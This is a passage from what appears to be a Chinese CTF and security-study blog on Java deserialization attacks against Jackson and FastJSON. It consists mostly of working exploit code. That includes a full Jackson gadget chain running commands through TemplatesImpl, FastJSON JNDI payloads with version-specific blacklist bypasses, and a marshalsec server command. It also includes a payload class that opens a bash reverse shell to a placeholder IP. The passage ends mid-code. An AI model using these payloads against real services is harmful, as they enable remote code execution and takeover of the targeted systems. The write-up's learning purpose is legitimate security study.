id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p><a href="https://xz.aliyun.com/u/68975">https://xz.aliyun.com/u/68975</a></p><p><code>org.springframework.aop.framework.JdkDynamicAopProxy</code> 来解决jackson链子的随机性问题</p><p>动态代理是十分强大的，被代理对象所能调用的方法取决与我们所给的接口，其功能取决与我们所给的 handler。当我们用java的反射 <code>getDeclaredMethods</code> 方法去获取其所有方法时也是根据我们提供的接口去获取的</p><p>demo</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> jackson;<span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<span class="hljs-keyword">import</span> java.lang.reflect.Method;<span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Proxy_test</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(ProxyTest.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;test1.class, test2.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyHandler</span>());        <span class="hljs-keyword">for</span>(Method m: o.getClass().getDeclaredMethods())&#123;            System.out.println(m.getName());        &#125;    &#125;&#125;<span class="hljs-keyword">interface</span> <span class="hljs-title class_">test1</span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">say456</span><span class="hljs-params">()</span>;&#125;<span class="hljs-keyword">interface</span> <span class="hljs-title class_">test2</span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test123</span><span class="hljs-params">()</span>;&#125;<span class="hljs-keyword">class</span> <span class="hljs-title class_">ProxyTest</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">eat</span><span class="hljs-params">()</span>&#123;        System.out.println(<span class="hljs-string">&quot;eat noting&quot;</span>);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span>&#123;        System.out.println(<span class="hljs-string">&quot;nonono&quot;</span>);    &#125;    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">(String a)</span>&#123;        <span class="hljs-keyword">return</span> a;    &#125;&#125;<span class="hljs-keyword">class</span> <span class="hljs-title class_">MyHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InvocationHandler</span>&#123;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable &#123;        System.out.println(<span class="hljs-string">&quot;invoke dynamic proxy handler&quot;</span>);        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;    &#125;&#125;</code></pre></div><p><img src="/../images/Jackson/image-20231118161431828.png" alt="image-20231118161431828"></p><p>所以主要就是看所给的接口和handler就可以了。</p><p><code>javax.xml.transform.Templates</code> 接口其只有 <code>newTransformer</code> 和 <code>getOutputProperties</code> 这个两个方法，让他作为我们代理所需的接口，这样最终通过 <code>getDeclaredMethods</code> 获取到的方法就只有 <code>newTransformer</code> 和 <code>getOutputProperties</code> 了，那么最终获得的getter方法便只有 <code>getOutputProperties</code> 了。</p><p>关于这个<code>Templates</code>接口，Boogipop大佬提到<code>TemplatesImpl templatesimpl = new TemplatesImpl();</code>最好换成<code>Templates templatesimpl = new TemplatesImpl();</code>能避免一些错误</p><p><img src="/../images/Jackson/image-20231118162500653.png" alt="image-20231118162500653"></p><p><img src="/../images/Jackson/image-20231118162554090.png" alt="image-20231118162554090"></p><p>这里的 target 获取到的对象由上面所说的 <code>advised</code> 属性得到，我们将所需的 <code>TemplatesImpl</code> 的对象用 <code>org.springframework.aop.framework.AdvisedSupport</code> 封装即可</p><p><img src="/../images/Jackson/image-20231118162614666.png" alt="image-20231118162614666"></p><p><img src="/../images/Jackson/image-20231118162632689.png" alt="image-20231118162632689"></p><h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><div class="code-wrapper"><pre><code class="hljs java">Class&lt;?&gt; clazz = Class.forName(<span class="hljs-string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>);Constructor&lt;?&gt; cons = clazz.getDeclaredConstructor(AdvisedSupport.class);cons.setAccessible(<span class="hljs-literal">true</span>);<span class="hljs-type">AdvisedSupport</span> <span class="hljs-variable">advisedSupport</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdvisedSupport</span>();advisedSupport.setTarget(templatesImpl);<span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) cons.newInstance(advisedSupport);<span class="hljs-type">Object</span> <span class="hljs-variable">proxyObj</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(clazz.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, handler);<span class="hljs-type">POJONode</span> <span class="hljs-variable">jsonNodes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(proxyObj);</code></pre></div><div class="code-wrapper"><pre><code class="hljs reasonml">package jackson;import com.fasterxml.jackson.databind.node.POJONode;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import javassist.*;import org.springframework.aop.framework.AdvisedSupport;import javax.management.BadAttributeValueExpException;import javax.xml.transform.Templates;import java.io.*;import java.lang.reflect.*;import java.util.Base64;public <span class="hljs-keyword">class</span> avoid_error &#123;    public static void main(String<span class="hljs-literal">[]</span> args) throws Exception &#123;        ClassPool pool = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ClassPool</span>.</span></span>get<span class="hljs-constructor">Default()</span>;        CtClass ctClass0 = pool.get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);        CtMethod writeReplace = ctClass0.get<span class="hljs-constructor">DeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>)</span>;        ctClass0.remove<span class="hljs-constructor">Method(<span class="hljs-params">writeReplace</span>)</span>;        ctClass0.<span class="hljs-keyword">to</span><span class="hljs-constructor">Class()</span>;        CtClass ctClass = pool.make<span class="hljs-constructor">Class(<span class="hljs-string">&quot;a&quot;</span>)</span>;        CtClass superClass = pool.get(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AbstractTranslet</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">Name()</span>);        ctClass.set<span class="hljs-constructor">Superclass(<span class="hljs-params">superClass</span>)</span>;        CtConstructor constructor = <span class="hljs-keyword">new</span> <span class="hljs-constructor">CtConstructor(<span class="hljs-params">new</span> CtClass[]&#123;&#125;,<span class="hljs-params">ctClass</span>)</span>;        constructor.set<span class="hljs-constructor">Body(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>)</span>;        ctClass.add<span class="hljs-constructor">Constructor(<span class="hljs-params">constructor</span>)</span>;        byte<span class="hljs-literal">[]</span> <span class="hljs-built_in">bytes</span> = ctClass.<span class="hljs-keyword">to</span><span class="hljs-constructor">Bytecode()</span>;        Templates templatesImpl = <span class="hljs-keyword">new</span> <span class="hljs-constructor">TemplatesImpl()</span>;        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">templatesImpl</span>, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-params">new</span> <span class="hljs-params">byte</span>[][]&#123;<span class="hljs-params">bytes</span>&#125;)</span>;        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">templatesImpl</span>, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>)</span>;        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">templatesImpl</span>, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-params">null</span>)</span>;        <span class="hljs-comment">//利用 JdkDynamicAopProxy 进行封装使其稳定触发</span>        Class&lt;?&gt; clazz = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>)</span>;        Constructor&lt;?&gt; cons = clazz.get<span class="hljs-constructor">DeclaredConstructor(AdvisedSupport.<span class="hljs-params">class</span>)</span>;        cons.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;        AdvisedSupport advisedSupport = <span class="hljs-keyword">new</span> <span class="hljs-constructor">AdvisedSupport()</span>;        advisedSupport.set<span class="hljs-constructor">Target(<span class="hljs-params">templatesImpl</span>)</span>;        InvocationHandler handler = (InvocationHandler) cons.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(<span class="hljs-params">advisedSupport</span>)</span>;        Object proxyObj = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Proxy</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">ProxyInstance(<span class="hljs-params">clazz</span>.<span class="hljs-params">getClassLoader</span>()</span>, <span class="hljs-keyword">new</span> Class<span class="hljs-literal">[]</span>&#123;<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Templates</span>.</span></span><span class="hljs-keyword">class</span>&#125;, handler);        POJONode jsonNodes = <span class="hljs-keyword">new</span> <span class="hljs-constructor">POJONode(<span class="hljs-params">proxyObj</span>)</span>;        BadAttributeValueExpException exp = <span class="hljs-keyword">new</span> <span class="hljs-constructor">BadAttributeValueExpException(<span class="hljs-params">null</span>)</span>;        Field <span class="hljs-keyword">val</span> = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>)</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;val&quot;</span>)</span>;        <span class="hljs-keyword">val</span>.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;        <span class="hljs-keyword">val</span>.set(exp,jsonNodes);        deserial(serial(exp));    &#125;    <span class="hljs-keyword">private</span> static void set<span class="hljs-constructor">FieldValue(Object <span class="hljs-params">obj</span>, String <span class="hljs-params">field</span>, Object <span class="hljs-params">arg</span>)</span> throws Exception&#123;        Field f = obj.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-params">field</span>)</span>;        f.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;        f.set(obj, arg);    &#125;    public static void deserial(String data) throws Exception &#123;        byte<span class="hljs-literal">[]</span> base64decodedBytes = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Base64</span>.</span></span>get<span class="hljs-constructor">Decoder()</span>.decode(data);        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ByteArrayInputStream(<span class="hljs-params">base64decodedBytes</span>)</span>;        ObjectInputStream ois = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ObjectInputStream(<span class="hljs-params">bais</span>)</span>;        ois.read<span class="hljs-constructor">Object()</span>;        ois.close<span class="hljs-literal">()</span>;    &#125;    public static String serial(Object data) throws Exception &#123;        ByteArrayOutputStream barr = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ByteArrayOutputStream()</span>;        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ObjectOutputStream(<span class="hljs-params">barr</span>)</span>;        objectOutputStream.write<span class="hljs-constructor">Object(<span class="hljs-params">data</span>)</span>;        objectOutputStream.close<span class="hljs-literal">()</span>;        String res = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Base64</span>.</span></span>get<span class="hljs-constructor">Encoder()</span>.encode<span class="hljs-constructor">ToString(<span class="hljs-params">barr</span>.<span class="hljs-params">toByteArray</span>()</span>);        return res;    &#125;&#125;</code></pre></div><h1 id="题目中出到的有关jackson的一些东西"><a href="#题目中出到的有关jackson的一些东西" class="headerlink" title="题目中出到的有关jackson的一些东西"></a>题目中出到的有关jackson的一些东西</h1><h2 id="JacksonInject"><a href="#JacksonInject" class="headerlink" title="JacksonInject"></a>JacksonInject</h2><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@JsonCreator</span>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyBean</span><span class="hljs-params">(<span class="hljs-meta">@JsonProperty(&quot;Base64Code&quot;)</span> String Base64Code, <span class="hljs-meta">@JacksonInject</span> Boolean IfInput)</span> &#123;       <span class="hljs-built_in">this</span>.Base64Code = Base64Code;       <span class="hljs-built_in">this</span>.IfInput = IfInput;   &#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs less"><span class="hljs-variable">@JsonCreator</span>加在构造函数上面用于反序列化<span class="hljs-variable">@JsonProperty</span>指定Json数据中该属性的键名<span class="hljs-comment">//上面这个例子为例，即使变量名不叫Base64Code，序列化后该值的键名一定是Base64Code</span><span class="hljs-variable">@JacksonInject</span>有该注解的属性它的值不能从Json中获取</code></pre></div><p>这与Jackson的处理逻辑相关</p><p><a href="http://blog.kuron3k0.vip/2021/04/10/vulns-of-misunderstanding-annotation/">误解注解产生的漏洞 - kuron3k0的博客 | kuron3k0’s Blog</a></p><div class="code-wrapper"><pre><code class="hljs crmsh">调用readValue后，进入到_deserializeUsingPropertyBased函数，这里循环处理我们的键值对，当前正在处理空键值，propName为空根据propName会去_propertyLookup中取出对应的creator <span class="hljs-keyword">property</span><span class="hljs-title"></span>，从名字也能看出来，这个就是我们之前的注解生成的，username和password都有对应同名字的键名，但是标注了@JacksonInject键名为空随后调用_deserializeWithErrorWrapping反序列化得到对应的值，并赋值给buffer中的_creatorParameters当处理完所有键值对后，取出_creatorParameters调用User的构造函数</code></pre></div><p>调试可以发现，IfInput对应的键名为空，所以获取的是<code>&quot;&quot;</code>的值</p><p>给出答案，让IfInput的键名为空  即可给IfInput赋值</p><div class="code-wrapper"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;base64Code&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;AAAAAAAA&quot;</span><span class="hljs-punctuation">&#125;</span></code></pre></div><p>当然这种 trick 也只适用于 creator 中只有一个 <code>@JacksonInject</code> 注解的，如果有多个注解，那么 <code>&quot;&quot;</code> 的索引位置只会是一个，一样会走到 <code>_findMissing</code></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>FastJSON</title>
    <link href="/2023/09/24/FastJSON/"/>
    <url>/2023/09/24/FastJSON/</url>
    
    <content type="html"><![CDATA[<h1 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h1><p>前言：这一部分停的有点久了，内容多，一直看别人分析源码，然后存结果，有点像以前只看文章不刷题的时候，看起来会了，但还是不会做，为了避免这种情况，所以决定写这篇文章，让自己动手尝试，顺便保存结果</p><div class="code-wrapper"><pre><code class="hljs reasonml">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.student&quot;</span>,<span class="hljs-string">&quot;age&quot;</span>:<span class="hljs-number">6</span>&#125;<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">JSON</span>.</span></span>parse<span class="hljs-constructor">Object()</span></code></pre></div><p>像这样就会调用student类中的setage和getage方法</p><h2 id="parse和parseObject的区别"><a href="#parse和parseObject的区别" class="headerlink" title="parse和parseObject的区别"></a>parse和parseObject的区别</h2><p>parseObject：返回 fastjson.JSONObject 类</p><p>parse ：返回我们的类 User</p><p>一般来说 parseObject 的利用面更广</p><h2 id="FastJSON调用getter常用两种方式，1、-ref，2、JSONObject。"><a href="#FastJSON调用getter常用两种方式，1、-ref，2、JSONObject。" class="headerlink" title="FastJSON调用getter常用两种方式，1、$ref，2、JSONObject。"></a>FastJSON调用getter常用两种方式，1、$ref，2、JSONObject。</h2><p>$ref：&gt;&#x3D;1.2.36</p><p>JSONObject：&lt;&#x3D;1.2.36</p><p><strong>要想使用$ref赋值，则不能使用JSONObject调用getter</strong>，因为在parse时就会调用到getter方法，无法等到处理完$ref的任务后再调用getter</p><h2 id="checkAutoType"><a href="#checkAutoType" class="headerlink" title="checkAutoType"></a>checkAutoType</h2><p>如果开启了就是先白名单过滤，再黑名单。</p><p>如果没开启就是会先黑名单，再白名单。</p><h2 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h2><p><code>com.sun.rowset.JdbcRowSetImpl</code>中的<code>dataSourceName</code>和<code>autoCommit</code>都有set方法</p><p>在<code>setautoCommit()</code>然后跟进发现</p><div class="code-wrapper"><pre><code class="hljs abnf">InitialContext var1 <span class="hljs-operator">=</span> new InitialContext()<span class="hljs-comment">;</span>DataSource var2 <span class="hljs-operator">=</span> (DataSource)var1.lookup(this.getDataSourceName())<span class="hljs-comment">;</span></code></pre></div><p>能够JNDI</p><h3 id="解题代码"><a href="#解题代码" class="headerlink" title="解题代码"></a>解题代码</h3><div class="code-wrapper"><pre><code class="hljs json">#<span class="hljs-number">1.2</span><span class="hljs-number">.24</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;dataSourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;rmi://127.0.0.1:1099/#exp1&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;autoCommit&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">&#125;</span>#<span class="hljs-number">1.2</span><span class="hljs-number">.47</span><span class="hljs-punctuation">&#123;</span>    <span class="hljs-attr">&quot;a&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.Class&quot;</span><span class="hljs-punctuation">,</span>        <span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span>    <span class="hljs-attr">&quot;b&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="hljs-punctuation">,</span>        <span class="hljs-attr">&quot;dataSourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;rmi://127.0.0.1:1099/#exp1&quot;</span><span class="hljs-punctuation">,</span>  #对应文件名不能变        <span class="hljs-attr">&quot;autoCommit&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span></code></pre></div><p><code>python -m http.server</code></p><p><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://vps_ip:8080/#exp1 1099</code></p><div class="code-wrapper"><pre><code class="hljs haxe"><span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">exp1</span></span>&#123;    <span class="hljs-keyword">static</span> &#123;        <span class="hljs-keyword">try</span> &#123;            Runtime rt = Runtime.getRuntime();            <span class="hljs-keyword">String</span>[] commands = &#123;<span class="hljs-string">&quot;bash&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,<span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/xx.xx.xx.xx/7777 0&gt;&amp;1&quot;</span>&#125;;            Process pc = rt.exec(commands);            pc.waitFor();        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-type">RuntimeException</span>(e);        &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-type">RuntimeException</span>(e);        &#125;    &#125;&#125;</code></pre></div><h2 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h2><p><code>_outputProperties</code>和<code>_bytecodes</code>由private修饰，必须加入<code>Feature.SupportNonPublicField</code>在<code>parseObject</code>中才能触发</p><div class="code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">JSON</span>.</span></span>parse<span class="hljs-constructor">Object(<span class="hljs-params">payload</span>, Feature.SupportNonPublicField)</span>;</code></pre></div><h3 id="解题代码-1"><a href="#解题代码-1" class="headerlink" title="解题代码"></a>解题代码</h3><div class="code-wrapper"><pre><code class="hljs perl">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>, <span class="hljs-string">&quot;_bytecodes&quot;</span>:[<span class="hljs-string">&quot;yv66vgAAADQA....&quot;</span>], <span class="hljs-string">&#x27;_name&#x27;</span>:<span class="hljs-string">&#x27;c.c&#x27;</span>, <span class="hljs-string">&#x27;_tfactory&#x27;</span>:&#123; &#125;,<span class="hljs-string">&quot;_outputProperties&quot;</span>:&#123;&#125;, <span class="hljs-string">&quot;_name&quot;</span>:<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;_version&quot;</span>:<span class="hljs-string">&quot;1.0&quot;</span>, <span class="hljs-string">&quot;allowedProtocols&quot;</span>:<span class="hljs-string">&quot;all&quot;</span>&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">exp</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-title function_">exp</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;        <span class="hljs-built_in">super</span>();        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;    &#125;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> fj;<span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<span class="hljs-keyword">import</span> java.io.FileInputStream;<span class="hljs-keyword">import</span> java.util.Base64;<span class="hljs-keyword">import</span> java.util.Base64.*;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">baseencode</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String args[])</span> &#123;        <span class="hljs-type">byte</span>[] buffer = <span class="hljs-literal">null</span>;        <span class="hljs-type">String</span> <span class="hljs-variable">filepath</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;C:\\Users\\86136\\Desktop\\cc1\\target\\classes\\exp.class&quot;</span>;        <span class="hljs-keyword">try</span> &#123;            <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filepath);            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();            <span class="hljs-type">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];            <span class="hljs-type">int</span> n;            <span class="hljs-keyword">while</span>((n = fis.read(b))!=-<span class="hljs-number">1</span>) &#123;                bos.write(b,<span class="hljs-number">0</span>,n);            &#125;            fis.close();            bos.close();            buffer = bos.toByteArray();        &#125;<span class="hljs-keyword">catch</span>(Exception e) &#123;            e.printStackTrace();        &#125;        <span class="hljs-type">Encoder</span> <span class="hljs-variable">encoder</span> <span class="hljs-operator">=</span> Base64.getEncoder();        <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> encoder.encodeToString(buffer);        System.out.println(value);    &#125;&#125;</code></pre></div><h2 id="c3p0基于fastjson进行JNDI注入"><a href="#c3p0基于fastjson进行JNDI注入" class="headerlink" title="c3p0基于fastjson进行JNDI注入"></a>c3p0基于fastjson进行JNDI注入</h2><div class="code-wrapper"><pre><code class="hljs perl">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.mchange.v2.c3p0.JndiRefForwardingDataSource&quot;</span>,<span class="hljs-string">&quot;jndiName&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:1389/calc&quot;</span>, <span class="hljs-string">&quot;loginTimeout&quot;</span>:<span class="hljs-number">0</span>&#125;</code></pre></div><h1 id="不同版本的绕过"><a href="#不同版本的绕过" class="headerlink" title="不同版本的绕过"></a>不同版本的绕过</h1><h2 id="1-2-25-1-2-41"><a href="#1-2-25-1-2-41" class="headerlink" title="1.2.25-1.2.41"></a>1.2.25-1.2.41</h2><div class="code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ParserConfig</span>.</span></span>get<span class="hljs-constructor">GlobalInstance()</span>.set<span class="hljs-constructor">AutoTypeSupport(<span class="hljs-params">true</span>)</span>;  <span class="hljs-comment">//开启autoTypeSupport </span></code></pre></div><div class="code-wrapper"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;dataSourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://127.0.0.1:1389/g0tvin&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;autoCommit&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">&#125;</span></code></pre></div><h2 id="1-2-25-1-2-42-双写绕过"><a href="#1-2-25-1-2-42-双写绕过" class="headerlink" title="1.2.25-1.2.42   (双写绕过)"></a>1.2.25-1.2.42   (双写绕过)</h2><div class="code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ParserConfig</span>.</span></span>get<span class="hljs-constructor">GlobalInstance()</span>.set<span class="hljs-constructor">AutoTypeSupport(<span class="hljs-params">true</span>)</span>;  <span class="hljs-comment">//开启autoTypeSupport </span></code></pre></div><div class="code-wrapper"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;dataSourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://127.0.0.1:1389/g0tvin&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;autoCommit&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">&#125;</span></code></pre></div><h2 id="1-2-25-1-2-43"><a href="#1-2-25-1-2-43" class="headerlink" title="1.2.25-1.2.43"></a>1.2.25-1.2.43</h2><p>修复了<code>L;</code> 以及双写，还对<code>[</code>做处理，利用这个处理进行绕过</p><div class="code-wrapper"><pre><code class="hljs scss">ParserConfig<span class="hljs-selector-class">.getGlobalInstance</span>()<span 